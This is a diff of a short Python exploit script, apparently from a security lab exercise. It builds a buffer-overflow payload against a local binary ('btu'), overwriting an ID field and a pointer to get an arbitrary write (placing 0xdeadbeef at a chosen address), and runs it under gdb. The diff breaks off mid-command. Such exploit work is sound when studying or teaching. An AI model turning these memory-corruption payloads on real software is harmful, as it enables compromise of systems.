@@ -1,18 +1,15 @@
 #!/usr/bin/env python3
 
 import subprocess
-# build the payload of last task same as this.
 
 # Define payload components
 passwordBuff = b'\x61' * 32                 # 32 bytes of 'a'
-idBuff = b'\xff\x1c\x45\x6a'                # Klaus ID
-targetAddr = b'\xa0\x0c\x05\x08'              # write_log address
-# heapAddr = b'\xa0\x0c\x05\x08'              # heap address
-headAddr = b'\xa0\xc3\xff\xff'              # heap address (from gdb)
-
+idBuff = b'\xaa\xaa\xaa\xaa'                # junk ID overwrite
+targetAddr = b'\xcd\xab\xff\xff'            # record->name = 0xffffabcd
+nameBuff = b'\xef\xbe\xad\xde'              # 0xdeadbeef -> to be placed in the target address
 
 # Full password payload
-passPayload = passwordBuff + idBuff + targetAddr + heapAddr
+passPayload = passwordBuff + idBuff + targetAddr
 
 # Function to convert bytes to a Python byte-escaped string
 def to_python_bytestr(b: bytes) -> str:
@@ -20,14 +17,11 @@ def to_python_bytestr(b: bytes) -> str:
 
 # Convert to python3-compatible command line string
 pass_py_str = to_python_bytestr(passPayload)
-
-# creating exmatriculate
-exmatriculateBuff = b'\x2e\xb1\x04\x08'              # 0xdeadbeef -> to be placed in the target address
-name_py_str = to_python_bytestr(exmatriculateBuff)
+name_py_str = to_python_bytestr(nameBuff)
 
 # Build GDB command using python3 -c for both args
 gdb_cmd = (
-    "gdb --args ./build/bin/btu add Abdelaziz "
+    "gdb --args ./build/bin/btu add hamada "
     f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{name_py_str}\")')\" "
     " 5555 "
     f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{pass_py_str}\")')\"" 
